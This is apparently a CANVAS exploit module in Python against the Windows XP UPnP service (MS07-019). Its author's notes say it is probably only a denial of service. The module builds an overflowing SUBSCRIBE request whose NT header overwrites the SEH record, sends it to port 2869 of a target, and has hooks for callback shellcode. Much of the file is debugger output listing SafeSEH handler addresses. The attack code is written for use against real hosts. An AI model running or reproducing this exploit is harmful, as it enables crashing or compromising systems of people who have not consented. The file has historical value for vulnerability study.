#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Windows XP UPnP Overflow'
DESCRIPTION='Windows XP UPnP upnphost.dll CHttpRequest::GetServerVariable Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['Date public']='04/10/07'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS07-019.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-1204'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1204'
DOCUMENTATION['CVSS'] = 6.8

VERSION='1.0'
GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']

NAME=DESCRIPTION

NOTES="""
Windows XP UPnP upnphost.dll CHttpRequest::GetServerVariable Stack Overflow

UPnP service is available on port 2869/tcp. At least one service must have
registered itself to upnphost for this to work: ICS or WMP11 Media Sharing do
that.

Curiously, it seems that this bug was introduced in XP SP2, since SP1a doesn't
have the faulty memory copy operation. This is located in a svchost.exe instance,
which means it's covered by DEP OptIn (default). Invalid characters are ranging
from \x00 to \x1f included (though \x09 works), and \x7f, which won't let us use
return addresses outside DLLs and we can't then bypass SafeSEH.

So from my point of view, it's not exploitable even with DEP AlwaysOff, unless
someone has some special voodoo for that (which I'll be grateful to learn).

Tested on:
Windows XP SP2 Professional English UP2DATE

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/ms07_019/ms07_019.py -v 1 -t 10.10.11.21 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import canvasengine
runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

'''
ImmDbg SafeSEH Plugin Output

Address    Message
           ShimEng.dll: SafeSEH protected
           ShimEng.dll: 2 handler(s)
           0x5cb7db48
           0x5cb7dcf4
           urlmon.dll: SafeSEH protected
           urlmon.dll: 2 handler(s)
           0x6144f1a5
           0x614a386f
           webclnt.dll: SafeSEH protected
           webclnt.dll: 1 handler(s)
           0x5a6ed0ca
           msxml3.dll: SafeSEH protected
           msxml3.dll: 2 handler(s)
           0x749a9077
           0x749a91a4
           xpsp2res.dll: SafeSEH protected
           xpsp2res.dll: No handler
           kernel32.dll: SafeSEH protected
           kernel32.dll: 2 handler(s)
           0x7c80dea4
           0x7c839aa8
           msvcrt.dll: SafeSEH protected
           msvcrt.dll: 4 handler(s)
           0x77c2285b
           0x77c2296c
           0x77c3546c
           0x77c35c94
           ssdpsrv.dll: SafeSEH protected
           ssdpsrv.dll: 1 handler(s)
           0x765eb6b6
           SAMLIB.dll: SafeSEH protected
           SAMLIB.dll: 2 handler(s)
           0x71bf495a
           0x71bf4d8a
           netapi32.dll: SafeSEH protected
           netapi32.dll: 1 handler(s)
           0x5b86b499
           SSDPAPI.dll: SafeSEH protected
           SSDPAPI.dll: 1 handler(s)
           0x74f0572a
           ntdll.dll: SafeSEH protected
           ntdll.dll: 4 handler(s)
           0x7c9037d8
           0x7c903804
           0x7c90ee18
           0x7c90ef43
           wshtcpip.dll: SafeSEH protected
           wshtcpip.dll: 2 handler(s)
           0x71a921e6
           0x71a922f6
           httpapi.dll: SafeSEH protected
           httpapi.dll: 1 handler(s)
           0x67574e6a
           iertutil.dll: SafeSEH protected
           iertutil.dll: 2 handler(s)
           0x5dca8346
           0x5dcd7114
           udhisapi.dll: SafeSEH protected
           udhisapi.dll: No handler
           WININET.dll: SafeSEH protected
           WININET.dll: 2 handler(s)
           0x771f7488
           0x77245110
           Secur32.dll: SafeSEH protected
           Secur32.dll: 2 handler(s)
           0x77fe6a2c
           0x77fe6b3c
           WSOCK32.dll: SafeSEH protected
           WSOCK32.dll: No handler
           IMM32.DLL: SafeSEH protected
           IMM32.DLL: 2 handler(s)
           0x7639245d
           0x7639256d
           WS2HELP.dll: SafeSEH protected
           WS2HELP.dll: 2 handler(s)
           0x71aa2450
           0x71aa2560
           ole32.dll: SafeSEH protected
           ole32.dll: 1 handler(s)
           0x775f3f54
           SHLWAPI.dll: SafeSEH protected
           SHLWAPI.dll: 1 handler(s)
           0x77fc8555
           hnetcfg.dll: SafeSEH protected
           hnetcfg.dll: 211 handler(s)
           0x662e7dce
           0x662e8851
           0x662e886e
           0x662e8885
           0x662e88a7
           0x662e88c1
           0x662e88d8
           0x662e88ef
           0x662e8906
           0x662e8929
           0x662e8943
           0x662e8989
           0x662e89a0
           0x662e89bf
           0x662e89e4
           0x662e89fe
           0x662e8a18
           0x662e8a2f
           0x662e8a49
           0x662e8a60
           0x662e8a7a
           0x662e8aa1
           0x662e8ac2
           0x662e8ad9
           0x662e8af2
           0x662e8b0c
           0x662e8b1b
           0x662e8b47
           0x662e8b6a
           0x662e8b79
           0x662e8b88
           0x662e8b97
           0x662e8ba6
           0x662e8bb5
           0x662e8bc4
           0x662e8bdb
           0x662e8bfa
           0x662e8c11
           0x662e8c28
           0x662e8c41
           0x662e8c78
           0x662e8c9f
           0x662e8cce
           0x662e8ce5
           0x662e8d04
           0x662e8d23
           0x662e8d52
           0x662e8d89
           0x662e8dd0
           0x662e8e07
           0x662e8e46
           0x662e8e7d
           0x662e8eb4
           0x662e8ec3
           0x662e8ed2
           0x662e8ee1
           0x662e8ef0
           0x662e8eff
           0x662e8f0e
           0x662e8f1d
           0x662e8f2c
           0x662e8f4f
           0x662e8f66
           0x662e8f75
           0x662e8f8c
           0x662e8fa3
           0x662e8fbd
           0x662e8fd4
           0x662e8feb
           0x662e9004
           0x662e9013
           0x662e9032
           0x662e9041
           0x662e9064
           0x662e907b
           0x662e9095
           0x662e90ae
           0x662e90c5
           0x662e90d4
           0x662e90f7
           0x662e9106
           0x662e9115
           0x662e912c
           0x662e9143
           0x662e915a
           0x662e9171
           0x662e9194
           0x662e91a3
           0x662e91c2
           0x662e91dc
           0x662e91f3
           0x662e920a
           0x662e9221
           0x662e9238
           0x662e924f
           0x662e9266
           0x662e927d
           0x662e9294
           0x662e92ae
           0x662e92c5
           0x662e92dc
           0x662e92f3
           0x662e930a
           0x662e9323
           0x662e9332
           0x662e9353
           0x662e9362
           0x662e9383
           0x662e9392
           0x662e93b3
           0x662e93c2
           0x662e93e3
           0x662e93fa
           0x662e9411
           0x662e9428
           0x662e943f
           0x662e944e
           0x662e945d
           0x662e946c
           0x662e947b
           0x662e948a
           0x662e9499
           0x662e94a8
           0x662e94b7
           0x662e94c6
           0x662e94d5
           0x662e94e4
           0x662e94f3
           0x662e9512
           0x662e952c
           0x662e9553
           0x662e956d
           0x662e9584
           0x662e959d
           0x662e95d4
           0x662e95f3
           0x662e963a
           0x662e9651
           0x662e966b
           0x662e968a
           0x662e96c1
           0x662e9700
           0x662e9717
           0x662e973c
           0x662e9761
           0x662e9778
           0x662e9787
           0x662e9796
           0x662e97af
           0x662e97c6
           0x662e97d5
           0x662e97e4
           0x662e97f3
           0x662e980a
           0x662e9824
           0x662e9833
           0x662e9858
           0x662e9867
           0x662e987e
           0x662e98a5
           0x662e98b4
           0x662e98ce
           0x662e98e5
           0x662e98fe
           0x662e990d
           0x662e9924
           0x662e993b
           0x662e9954
           0x662e997b
           0x662e9992
           0x662e99b1
           0x662e99c8
           0x662e99e7
           0x662e9a06
           0x662e9a1d
           0x662e9a4c
           0x662e9ac3
           0x662e9b0a
           0x662e9b19
           0x662e9b28
           0x662e9b37
           0x662e9b46
           0x662e9b5d
           0x662e9b7c
           0x662e9b93
           0x662e9baa
           0x662e9bd8
           0x662e9bef
           0x662e9c14
           0x662e9c2d
           0x662e9c44
           0x662e9c5b
           0x662e9c6a
           0x662e9c79
           0x662e9c88
           0x662e9c97
           0x662e9ca6
           0x662e9cec
           0x662e9d23
           0x662e9d3a
           0x662e9d81
           0x662e9d90
           0x662e9d9f
           0x662e9dae
           0x662e9dbd
           0x662e9dcc
           0x662e9ddb
           0x662e9dea
           0x662e9df9
           0x662e9e08
           0x662e9e21
           USER32.dll: SafeSEH protected
           USER32.dll: 2 handler(s)
           0x77d70467
           0x77d7056d
           lmhsvc.dll: SafeSEH protected
           lmhsvc.dll: No handler
           regsvc.dll: SafeSEH protected
           regsvc.dll: 1 handler(s)
           0x76afc968
           OLEAUT32.dll: SafeSEH protected
           OLEAUT32.dll: 20 handler(s)
           0x7719b85d
           0x7719d0bf
           0x7719d0dd
           0x7719d0f9
           0x7719d128
           0x7719d146
           0x7719d175
           0x7719d194
           0x7719d1b2
           0x7719d1de
           0x7719d1fd
           0x7719d20c
           0x7719d251
           0x7719d29d
           0x7719d2e1
           0x7719d325
           0x7719d375
           0x7719d3b9
           0x7719d3fd
           0x7719d441
           SHELL32.dll: SafeSEH protected
           SHELL32.dll: 1 handler(s)
           0x7cb82984
           RPCRT4.dll: SafeSEH protected
           RPCRT4.dll: 2 handler(s)
           0x77ea392d
           0x77ea5ff5
           CLBCATQ.DLL: SafeSEH protected
           CLBCATQ.DLL: 47 handler(s)
           0x7703f76e
           0x7703fff1
           0x77040035
           0x77040079
           0x770400bd
           0x77040101
           0x77040145
           0x77040189
           0x770401cd
           0x77040211
           0x77040255
           0x770402ea
           0x77040315
           0x77040359
           0x7704039d
           0x770403e1
           0x77040425
           0x7704047e
           0x770404c1
           0x77040551
           0x770405a4
           0x770405e9
           0x7704062d
           0x77040671
           0x770406b5
           0x770406f9
           0x7704073d
           0x77040781
           0x770407c5
           0x77040809
           0x7704084d
           0x77040891
           0x770408d5
           0x7704091f
           0x77040965
           0x770409a9
           0x770409ed
           0x77040a31
           0x77040a81
           0x77040ac5
           0x77040b0d
           0x77040b60
           0x77040bad
           0x77040bf1
           0x77040c35
           0x77040c79
           0x77040cc1
           comctl32.dll: SafeSEH protected
           comctl32.dll: 1 handler(s)
           0x7745b262
           MSACM32.dll: SafeSEH protected
           MSACM32.dll: 1 handler(s)
           0x77bef5dc
           NTMARTA.DLL: SafeSEH protected
           NTMARTA.DLL: 1 handler(s)
           0x776a8c62
           COMRes.dll: SafeSEH protected
           COMRes.dll: No handler
           WLDAP32.dll: SafeSEH protected
           WLDAP32.dll: 1 handler(s)
           0x76f808b0
           AcGenral.DLL: SafeSEH protected
           AcGenral.DLL: 104 handler(s)
           0x6f8a611c
           0x6f8a622d
           0x6f8a649c
           0x6f8a6d90
           0x6f8aeb72
           0x6f8aeb8b
           0x6f8aeba2
           0x6f8aebb9
           0x6f8aebc8
           0x6f8aebdf
           0x6f8aec06
           0x6f8aec20
           0x6f8aec57
           0x6f8aec76
           0x6f8aeca3
           0x6f8aecba
           0x6f8aecd1
           0x6f8aecf6
           0x6f8aed1b
           0x6f8aed3a
           0x6f8aed51
           0x6f8aed60
           0x6f8aed77
           0x6f8aed8e
           0x6f8aeda5
           0x6f8aedc4
           0x6f8aee03
           0x6f8aee30
           0x6f8aee57
           0x6f8aee7e
           0x6f8aee95
           0x6f8aeea4
           0x6f8aeec3
           0x6f8aeedd
           0x6f8aeef7
           0x6f8aef16
           0x6f8aef35
           0x6f8aef4c
           0x6f8aef63
           0x6f8aef7a
           0x6f8aef91
           0x6f8aefc8
           0x6f8aefdf
           0x6f8aefee
           0x6f8af005
           0x6f8af01c
           0x6f8af033
           0x6f8af052
           0x6f8af069
           0x6f8af080
           0x6f8af08f
           0x6f8af0a6
           0x6f8af0c5
           0x6f8af0e4
           0x6f8af12b
           0x6f8af142
           0x6f8af161
           0x6f8af170
           0x6f8af19f
           0x6f8af1ce
           0x6f8af1e5
           0x6f8af1fc
           0x6f8af213
           0x6f8af22a
           0x6f8af249
           0x6f8af263
           0x6f8af27a
           0x6f8af291
           0x6f8af2a8
           0x6f8af2bf
           0x6f8af2de
           0x6f8af305
           0x6f8af31c
           0x6f8af34c
           0x6f8af387
           0x6f8af3d6
           0x6f8af405
           0x6f8af41c
           0x6f8af43b
           0x6f8af45a
           0x6f8af471
           0x6f8af488
           0x6f8af4b8
           0x6f8af4c7
           0x6f8af4ec
           0x6f8af503
           0x6f8af51b
           0x6f8af543
           0x6f8af562
           0x6f8af584
           0x6f8af59b
           0x6f8af5aa
           0x6f8af5c1
           0x6f8af5db
           0x6f8af5f2
           0x6f8af609
           0x6f8af620
           0x6f8af637
           0x6f8af666
           0x6f8af67d
           0x6f8af697
           0x6f8af6ae
           0x6f8af6c5
           0x6f8af70d
           iphlpapi.dll: SafeSEH protected
           iphlpapi.dll: 1 handler(s)
           0x76d72d16
           USERENV.dll: SafeSEH protected
           USERENV.dll: 1 handler(s)
           0x76a5cdf1
           WINMM.dll: SafeSEH protected
           WINMM.dll: 2 handler(s)
           0x76b4af1f
           0x76b4b02f
           GDI32.dll: SafeSEH protected
           GDI32.dll: 2 handler(s)
           0x77f30d2c
           0x77f30e32
           upnphost.dll: SafeSEH protected
           upnphost.dll: 1 handler(s)
           0x62c14946
           UxTheme.dll: SafeSEH protected
           UxTheme.dll: 1 handler(s)
           0x5ad9d514
           svchost.exe: SafeSEH protected
           svchost.exe: No handler
           VERSION.dll: SafeSEH protected
           VERSION.dll: 2 handler(s)
           0x77c01e85
           0x77c01f95
           ADVAPI32.dll: SafeSEH protected
           ADVAPI32.dll: 2 handler(s)
           0x77df5655
           0x77dfee6a
           WS2_32.dll: SafeSEH protected
           WS2_32.dll: 1 handler(s)
           0x71ac24af
           mswsock.dll: SafeSEH protected
           mswsock.dll: 1 handler(s)
           0x71a771c8
           Normaliz.dll: SafeSEH protected
           Normaliz.dll: 2 handler(s)
           0x006f18a0
           0x006f1c82
           WINHTTP.dll: SafeSEH protected
           WINHTTP.dll: 1 handler(s)
           0x4d5327ca
'''

targets = {
    0:['Autodetect',0],
    1:['Windows XP SP2 (DoS)',0x42424242] #0x614a386f does weird things
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=2869
        self.badstring='\x00'
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.shellcode=self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)
        return self.shellcode

    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.eip=targets[self.version]

        payload=''
        payload+='A'*(0xb70-0x818)
        payload+=struct.pack('<LL',0xffffffff,self.eip) #SEH
        payload+='C'*(0x1004-0x818-len(payload)) #access violation

        request=''
        request+='SUBSCRIBE /upnphost/udhisapi.dll?event=STOIC HTTP/1.1\r\n'
        request+='Host: %s:%d\r\n'%(self.host,self.port)
        request+='NT: '+payload+'\r\n'
        request+='\r\n'

        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        self.websend(s,request)
        
        time.sleep(2)

        if self.ISucceeded():
            return 1
        s.close()
        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'% (i,listline[0])
            i=i+1

    def usage(self):
        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
